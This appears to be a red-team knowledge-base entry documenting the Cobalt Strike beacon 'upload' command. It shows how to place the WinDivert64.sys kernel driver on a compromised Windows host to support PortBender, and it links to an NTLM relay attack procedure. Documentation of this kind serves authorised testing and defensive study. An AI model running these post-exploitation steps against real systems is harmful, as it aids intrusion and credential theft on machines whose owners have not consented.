---
type: command
executor: beacon
data: 'upload C:\Tools\PortBender\WinDivert64.sys'
tags:
  - cobalt-strike
  - upload
platforms:
  - Windows
verified: true
validated: true
---

# beacon-upload-windivert-driver

## Command

```beacon
upload C:\Tools\PortBender\WinDivert64.sys
```

## Description

This beacon command uploads a file (e.g., kernel driver) from the attacker's client to the compromised host, necessary for tools requiring low-level access like PortBender.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| C:\Tools\PortBender\WinDivert64.sys | Local path to the file on the Cobalt Strike client | Yes |

## Examples

### Basic Usage

```beacon
upload C:\Tools\WinDivert64.sys
```

### Advanced Usage

```beacon
upload /path/to/file.sys C:\temp\file.sys
```
(Specify remote path if needed.)

## Expected Output

Upload progress: "Uploading [filename] (size bytes)" followed by "Upload complete".

## Related

- [[procedures/NTLM-Relay-Attack-via-Cobalt-Strike]]
- [[tools/Cobalt-Strike]]
